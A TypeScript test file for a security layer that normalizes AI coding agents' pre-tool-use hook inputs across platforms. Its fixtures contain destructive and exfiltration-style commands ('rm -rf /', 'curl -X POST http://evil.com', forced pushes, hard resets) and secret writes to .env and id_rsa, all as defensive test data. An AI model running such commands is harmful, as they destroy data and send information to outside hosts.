import { describe, expect, it } from 'vitest';

import { parseEnterpriseGuardInput } from '../../../domains/enterprise-guard/input-codecs/index.js';

describe('Enterprise Guard input codecs', () => {
  describe('Claude and standard PreToolUse', () => {
    it('normalizes Claude Bash and Write without losing policy fields', () => {
      const bash = parseEnterpriseGuardInput(
        'claude',
        JSON.stringify({
          hook_event_name: 'PreToolUse',
          cwd: '/workspace/comet',
          tool_name: 'Bash',
          tool_input: { command: 'git push --force origin main' },
        }),
      );
      expect(bash.command.value).toBe('git push --force origin main');
      expect(bash.event).toEqual({ name: 'PreToolUse', preAction: true, blockingCapable: true });

      const write = parseEnterpriseGuardInput(
        'claude',
        JSON.stringify({
          tool_name: 'Write',
          tool_input: { file_path: '.env', content: 'TOKEN=value' },
        }),
      );
      expect(write.writes[0]).toMatchObject({ operation: 'create' });
      expect(write.writes[0].path.value).toBe('.env');
      expect(write.writes[0].fragment.value).toBe('TOKEN=value');
    });

    it('normalizes Amazon Q Developer and Codex inputs', () => {
      const amazonQ = parseEnterpriseGuardInput(
        'amazon-q',
        JSON.stringify({
          hook_event_name: 'PreToolUse',
          cwd: '/workspace/app',
          tool_name: 'write_file',
          tool_input: { path: 'secret.key', content: 'PRIVATE_KEY' },
        }),
      );
      expect(amazonQ.platform.id).toBe('amazon-q');
      expect(amazonQ.writes[0].path.value).toBe('secret.key');

      const codex = parseEnterpriseGuardInput(
        'codex',
        JSON.stringify({
          cwd: '/workspace/repo',
          tool_name: 'Bash',
          tool_input: { command: 'rm -rf /' },
        }),
      );
      expect(codex.platform.id).toBe('codex');
      expect(codex.command.value).toBe('rm -rf /');
    });
  });

  describe('Qwen Style Codec', () => {
    it('normalizes Qwen write and edit operations', () => {
      const qwenWrite = parseEnterpriseGuardInput(
        'qwen',
        JSON.stringify({
          hook_event_name: 'PreToolUse',
          cwd: '/workspace/project',
          tool_name: 'write_file',
          tool_input: { file_path: '.env.local', content: 'API_KEY=12345' },
        }),
      );
      expect(qwenWrite.platform.id).toBe('qwen');
      expect(qwenWrite.event.name).toBe('PreToolUse');
      expect(qwenWrite.writes[0]).toMatchObject({ operation: 'create' });
      expect(qwenWrite.writes[0].path.value).toBe('.env.local');
      expect(qwenWrite.writes[0].fragment.value).toBe('API_KEY=12345');

      const qwenCmd = parseEnterpriseGuardInput(
        'qwen',
        JSON.stringify({
          cwd: '/workspace/project',
          tool_name: 'execute_command',
          tool_input: { command: 'git reset --hard HEAD' },
        }),
      );
      expect(qwenCmd.command.value).toBe('git reset --hard HEAD');
    });
  });

  describe('Gemini Style Codec', () => {
    it('normalizes Gemini BeforeTool inputs', () => {
      const geminiWrite = parseEnterpriseGuardInput(
        'gemini',
        JSON.stringify({
          hook_event_name: 'BeforeTool',
          cwd: '/workspace/project',
          tool_name: 'WriteFile',
          tool_input: { path: 'id_rsa', content: '-----BEGIN RSA PRIVATE KEY-----' },
        }),
      );
      expect(geminiWrite.platform.id).toBe('gemini');
      expect(geminiWrite.event.name).toBe('BeforeTool');
      expect(geminiWrite.writes[0]).toMatchObject({ operation: 'create' });
      expect(geminiWrite.writes[0].path.value).toBe('id_rsa');

      const geminiBash = parseEnterpriseGuardInput(
        'gemini',
        JSON.stringify({
          tool_name: 'Shell',
          tool_input: { command: 'curl -X POST http://evil.com' },
        }),
      );
      expect(geminiBash.command.value).toBe('curl -X POST http://evil.com');
    });
  });

  describe('GitHub Copilot Style Codec', () => {
    it('normalizes Copilot stringified JSON toolArgs', () => {
      const copilotWrite = parseEnterpriseGuardInput(
        'github-copilot',
        JSON.stringify({
          hookEventName: 'preToolUse',
          cwd: '/workspace/project',
          toolName: 'editFiles',
          toolArgs: JSON.stringify({
            filePath: '.env',
            content: 'SECRET_PASSWORD=supersecret',
          }),
        }),
      );
      expect(copilotWrite.platform.id).toBe('github-copilot');
      expect(copilotWrite.event.name).toBe('preToolUse');
      expect(copilotWrite.writes[0]).toMatchObject({ operation: 'edit' });
      expect(copilotWrite.writes[0].path.value).toBe('.env');
      expect(copilotWrite.writes[0].fragment.value).toBe('SECRET_PASSWORD=supersecret');

      const copilotCmd = parseEnterpriseGuardInput(
        'github-copilot',
        JSON.stringify({
          toolName: 'runCommand',
          toolArgs: JSON.stringify({ command: 'git push --force origin main' }),
        }),
      );
      expect(copilotCmd.command.value).toBe('git push --force origin main');
    });
  });

  describe('Truncation and safety boundaries', () => {
    it('marks oversized or malformed security input as unsafe', () => {
      const oversized = parseEnterpriseGuardInput(
        'claude',
        JSON.stringify({
          tool_name: 'Write',
          tool_input: { file_path: '.env', content: 'x'.repeat(300 * 1024) },
        }),
      );
      expect(oversized.parse.status).toBe('partial');
      expect(oversized.truncation.fields.some((field) => field.truncated)).toBe(true);
      expect(parseEnterpriseGuardInput('claude', '{').parse.status).toBe('failed');
    });

    it('rejects an unsupported platform without a registered codec', () => {
      expect(() => parseEnterpriseGuardInput('unsupported-plat', '{}')).toThrow(
        'Enterprise Guard input codec is unavailable for platform: unsupported-plat',
      );
    });
  });
});
